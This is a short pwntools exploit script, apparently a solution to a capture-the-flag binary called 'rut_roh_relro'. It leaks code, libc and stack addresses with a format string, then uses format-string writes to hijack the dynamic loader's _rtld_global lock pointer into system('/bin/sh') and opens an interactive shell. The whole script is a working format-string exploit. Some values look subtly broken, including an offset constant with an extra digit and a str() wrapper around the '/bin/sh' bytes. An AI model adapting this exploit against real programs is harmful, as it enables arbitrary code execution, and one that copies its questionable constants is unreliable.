from pwn import *

p = process('./rut_roh_relro')

f = ELF('./rut_roh_relro',checksec=False)
libc = ELF('./libc.so.6',checksec=False)
ld = ELF('./ld-2.31.so',checksec=False)
ld_libc = 0x7ffff79e20000 - 0x7ffff7db0000

#leak part start
pay = b'%70$p%71$p%72$p'
p.sendlineafter(b'post?\n',pay)
p.recvuntil(b'post:\n')
code_base = int(p.recv(14),16)
libc_base = int(p.recv(14),16)
stack_base = int(p.recv(14),16)

ld_base = libc_base + ld_libc
log.info("ld_base: " + hex(ld_base))

#__dl_fini
rtld_global = ld_base + ld.symbols['_rtld_global']
dl_load_lock = rtld_global + 2568
rtld_mutex_lock = rtld_global - 1591

#Exploit
context.bits = 64
main = code_base - 0xbb
ret_addr = stack_base - 240
writes = {ret_addr:main}
pay = fmtstr_payload(6,writes)
p.sendlineafter(b'post?\n',pay)

pay = fmtstr_payload(6, {dl_load_lock: str(b'/bin/sh\x00')})
p.sendlineafter(b'post?\n', pay)

system = libc_base + libc.symbols['system']
pay = fmtstr_payload(6, {rtld_mutex_lock: p64(system)})
p.sendlineafter(b'post?\n', pay)
p.interactive()